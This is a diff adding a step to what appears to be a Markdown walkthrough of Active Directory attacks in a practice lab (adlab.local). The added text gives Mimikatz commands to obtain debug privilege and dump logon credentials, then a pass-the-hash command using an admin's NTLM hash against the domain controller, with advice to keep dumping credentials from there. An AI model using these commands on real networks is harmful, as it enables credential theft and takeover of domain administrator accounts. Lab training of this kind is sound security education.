@@ -394,7 +394,20 @@ copy {mimikatz_path_to_x64_folder}\*.* .
 ```
 - **First terminal**: Execute **Mimikatz** when the copy is complete.
 
+### 17. Now that you have the mimikatz on the admin machine make sure to use it as following
+- just like before we start with dumping the hashes and getting the debug privilege
+  ```bash
+  privilege::debug
+  sekurlsa::logonpasswords
+  ```
+- Find the admin's hash and use that to pass the hash into his account (from your own machine of course)
+- your command should now be targeting the dc not your local domain
+- example:
+```bash
+sekurlsa::pth /user:domad /domain:adlab.local /ntlm:cff48581d56085119bddffacfae51aeb /run:cmd.exe
+```
 
+- from there you can launch mimikatz again and continue to dump the credintials
 
 ## Persistence with Golden Ticket Attack
 
